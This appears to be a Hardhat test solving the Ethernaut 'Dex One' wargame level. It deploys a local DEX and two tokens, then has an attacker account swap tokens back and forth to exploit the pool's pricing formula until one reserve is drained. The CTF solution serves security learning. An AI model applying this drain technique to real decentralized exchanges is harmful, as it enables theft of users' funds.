import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {DexOne, SwappableTokenOne} from '../../types/typechain';

describe('Ethernaut 21: Dex One', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: DexOne;
  let token1: SwappableTokenOne;
  let token2: SwappableTokenOne;

  const DEX_TOKEN1_BALANCE = 100;
  const DEX_TOKEN2_BALANCE = 100;
  const ATTACKER_TOKEN1_BALANCE = 10;
  const ATTACKER_TOKEN2_BALANCE = 10;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    // deploy dex first
    contract = await ethers.getContractFactory('DexOne', owner).then(f => f.deploy());
    await contract.deployed();

    // deploy first of the two swap tokens
    token1 = await ethers
      .getContractFactory('SwappableTokenOne', owner)
      .then(f => f.deploy(contract.address, 'Alicetoken', 'ALCTOK', 5000));
    await token1.deployed();

    // deploy second of the two swap tokens
    token2 = await ethers
      .getContractFactory('SwappableTokenOne', owner)
      .then(f => f.deploy(contract.address, 'Bobtoken', 'BOBTOK', 5000));
    await token2.deployed();

    // register tokens to dex
    await contract.setTokens(token1.address, token2.address);

    // dex has 100 of each token
    await token1.transfer(contract.address, DEX_TOKEN1_BALANCE);
    await token2.transfer(contract.address, DEX_TOKEN2_BALANCE);

    // attacker has 10 of each token
    await token1.transfer(attacker.address, ATTACKER_TOKEN1_BALANCE);
    await token2.transfer(attacker.address, ATTACKER_TOKEN2_BALANCE);
  });

  it('should drain one of the tokens', async () => {
    // initial settings
    const maxiters = 10;
    const T1 = await contract.token1();
    const T2 = await contract.token2();
    let [t1_player, t2_player, t1_dex, t2_dex] = await Promise.all([
      contract.balanceOf(T1, attacker.address),
      contract.balanceOf(T2, attacker.address),
      contract.balanceOf(T1, contract.address),
      contract.balanceOf(T2, contract.address),
    ]);

    //   console.log(`
    // Initial
    //   D1: ${t1_dex}
    //   D2: ${t2_dex}
    //   P1: ${t1_player}
    //   P2: ${t2_player}`);

    for (let i = 1; i <= maxiters && t1_dex.gt(0) && t2_dex.gt(0); ++i) {
      if (i % 2) {
        // trade t1 to t2
        let a = t1_player;
        const sa = await contract.getSwapPrice(T1, T2, a);
        if (sa.gt(t2_dex)) {
          a = t1_dex;
        }

        // make the call
        await contract.connect(attacker).approve(contract.address, a);
        await contract.connect(attacker).swap(T1, T2, a);
      } else {
        // trade t2 to t1
        let a = t2_player;
        const sa = await contract.getSwapPrice(T2, T1, a);
        if (sa.gt(t1_dex)) {
          a = t2_dex;
        }

        // make the call
        await contract.connect(attacker).approve(contract.address, a);
        await contract.connect(attacker).swap(T2, T1, a);
      }

      // new balances
      [t1_player, t2_player, t1_dex, t2_dex] = await Promise.all([
        contract.balanceOf(T1, attacker.address),
        contract.balanceOf(T2, attacker.address),
        contract.balanceOf(T1, contract.address),
        contract.balanceOf(T2, contract.address),
      ]);
    }
  });

  after(async () => {
    // dex should be depleted of one of the tokens
    const t1balance = await token1.balanceOf(contract.address);
    const t2balance = await token2.balanceOf(contract.address);
    expect(t1balance.eq(0) || t2balance.eq(0)).to.be.true;
  });
});
